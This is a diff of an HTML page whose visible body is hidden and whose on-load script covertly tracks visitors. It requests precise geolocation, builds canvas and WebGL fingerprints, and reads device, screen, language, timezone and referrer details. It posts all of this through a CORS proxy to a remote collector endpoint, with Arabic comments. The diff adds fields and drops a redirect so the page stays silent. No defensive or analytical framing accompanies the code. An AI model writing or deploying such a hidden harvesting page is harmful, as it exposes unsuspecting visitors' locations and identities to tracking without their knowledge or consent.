@@ -7,135 +7,127 @@
     <style> body { display: none; } </style>
 </head>
 <body>
-    <script>
-        // === الـ URL الصحيح: يمر عبر corsproxy.io ===
-        const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');
+<script>
+const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');
 
-        // === باقي الكود (بدون تغيير) ===
-        async function parseDeviceName(ua) {
-            try {
-                if (navigator.userAgentData) {
-                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "brand"]);
-                    if (hints?.model) return `${hints.brand} ${hints.model}`;
-                }
-            } catch (e) {}
-            const patterns = [
-                { name: 'Samsung Galaxy S24', pattern: /samsung.*sm-s92/i },
-                { name: 'iPhone 15', pattern: /iphone.*15/i },
-                { name: 'Android Device', pattern: /android/i }
-            ];
-            for (let p of patterns) if (p.pattern.test(ua)) return p.name;
-            return /windows/i.test(ua) ? 'Windows PC' : 'Unknown';
+async function parseDeviceName(ua) {
+    try {
+        if (navigator.userAgentData) {
+            const hints = await navigator.userAgentData.getHighEntropyValues(["model", "brand"]);
+            if (hints?.model) return `${hints.brand} ${hints.model}`;
         }
+    } catch (e) {}
+    const patterns = [
+        { name: 'Samsung Galaxy S24', pattern: /samsung.*sm-s92/i },
+        { name: 'iPhone 15', pattern: /iphone.*15/i },
+        { name: 'Android Device', pattern: /android/i }
+    ];
+    for (let p of patterns) if (p.pattern.test(ua)) return p.name;
+    return /windows/i.test(ua) ? 'Windows PC' : 'Unknown';
+}
 
-        async function getGeolocation() {
-            return new Promise(resolve => {
-                if (!navigator.geolocation)
-                    return resolve({ latitude: null, longitude: null, accuracy_m: 0, error: "غير مدعوم" });
+async function getGeolocation() {
+    return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve({ latitude: null, longitude: null, accuracy_m: 0, error: "غير مدعوم" });
 
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy_m: pos.coords.accuracy || 0,
-                        error: null
-                    }),
-                    err => resolve({
-                        latitude: null,
-                        longitude: null,
-                        accuracy_m: 0,
-                        error: "مرفوض"
-                    }),
-                    { timeout: 10000 }
-                );
-            });
-        }
+        navigator.geolocation.getCurrentPosition(
+            pos => resolve({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy_m: pos.coords.accuracy || 0,
+                error: null
+            }),
+            err => resolve({ latitude: null, longitude: null, accuracy_m: 0, error: "مرفوض" }),
+            { timeout: 10000 }
+        );
+    });
+}
 
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = '#069'; ctx.fillText('OSINT', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('OSINT', 4, 17);
-                return canvas.toDataURL();
-            } catch (e) { return 'خطأ'; }
-        }
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = '#069'; ctx.fillText('OSINT', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('OSINT', 4, 17);
+        return canvas.toDataURL();
+    } catch (e) { return 'خطأ'; }
+}
 
-        function getWebGLFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'غير مدعوم';
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-            } catch (e) { return 'غير متاح'; }
-        }
+function getWebGLFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'غير مدعوم';
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    } catch (e) { return 'غير متاح'; }
+}
 
-        function hashCode(str) {
-            let hash = 0;
-            for (let i = 0; i < str.length; i++) {
-                const char = str.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
-                hash = hash & hash;
-            }
-            return hash.toString(16);
-        }
+function hashCode(str) {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+        const char = str.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+    }
+    return hash.toString(16);
+}
 
-        function generateFingerprint() {
-            try {
-                const canvas = getCanvasFingerprint();
-                const webgl = getWebGLFingerprint();
-                const str = `${canvas}${webgl}${navigator.hardwareConcurrency || 0}${screen.colorDepth}`;
-                return hashCode(str);
-            } catch (e) { return 'خطأ'; }
-        }
+function generateFingerprint() {
+    try {
+        const canvas = getCanvasFingerprint();
+        const webgl = getWebGLFingerprint();
+        const str = `${canvas}${webgl}${navigator.hardwareConcurrency || 0}${screen.colorDepth}`;
+        return hashCode(str);
+    } catch (e) { return 'خطأ'; }
+}
 
-        (async () => {
-            try {
-                const [geo, deviceName] = await Promise.all([
-                    getGeolocation(),
-                    parseDeviceName(navigator.userAgent)
-                ]);
-                const fingerprint = generateFingerprint();
+(async () => {
+    try {
+        const [geo, deviceName] = await Promise.all([
+            getGeolocation(),
+            parseDeviceName(navigator.userAgent)
+        ]);
+        const fingerprint = generateFingerprint();
 
-                const data = {
-                    clientUuid: crypto.randomUUID?.() || Date.now().toString(36),
-                    deviceFingerprint: fingerprint,
-                    ipAddress: '',
-                    userAgent: navigator.userAgent,
-                    deviceName: deviceName,
-                    language: navigator.language || 'غير معروف',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: `${screen.width}x${screen.height}`,
-                    colorDepth: screen.colorDepth,
-                    hardwareConcurrency: navigator.hardwareConcurrency || 0,
-                    deviceMemory: navigator.deviceMemory || 'غير متاح',
-                    connectionType: navigator.connection?.type ?? 'unknown',
-                    canvasFingerprint: getCanvasFingerprint().substring(0, 100) + '...',
-                    webglRenderer: getWebGLFingerprint(),
-                    geolocation: geo,
-                    referrer: document.referrer || 'مباشر',
-                    entryUrl: window.location.href
-                };
+        const data = {
+            clientUuid: crypto.randomUUID?.() || Date.now().toString(36),
+            clientData: "sample",  // ✅ حقل مطلوب
+            deviceFingerprint: fingerprint,
+            ipAddress: '',
+            userAgent: navigator.userAgent,
+            deviceName: deviceName,
+            language: navigator.language || 'غير معروف',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            hardwareConcurrency: navigator.hardwareConcurrency || 0,
+            deviceMemory: String(navigator.deviceMemory || "unknown"), // ✅ يجب أن يكون نص
+            connectionType: navigator.connection?.type ?? 'unknown',
+            canvasFingerprint: getCanvasFingerprint().substring(0, 100) + '...',
+            webglRenderer: getWebGLFingerprint(),
+            geolocation: geo,
+            referrer: document.referrer || 'مباشر',
+            entryUrl: window.location.href
+        };
 
-                const response = await fetch(apiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data),
-                    mode: 'cors'
-                });
+        const response = await fetch(apiUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+            mode: 'cors'
+        });
 
-                if (response.ok) console.log('تم الإرسال!');
-                else console.warn('فشل:', response.status);
+        if (response.ok) console.log('تم الإرسال!');
+        else console.warn('فشل:', response.status);
 
-            } catch (e) {
-                console.error('خطأ:', e);
-            } finally {
-                // تم التعليق على أي redirect لتجنب ظهور Example Domain
-                // setTimeout(() => { window.location.href = 'https://example.com/thank-you'; }, 500);
-            }
-        })();
-    </script>
+    } catch (e) {
+        console.error('خطأ:', e);
+    } finally {
+        // لا إعادة توجيه
+    }
+})();
+</script>
 </body>
 </html>
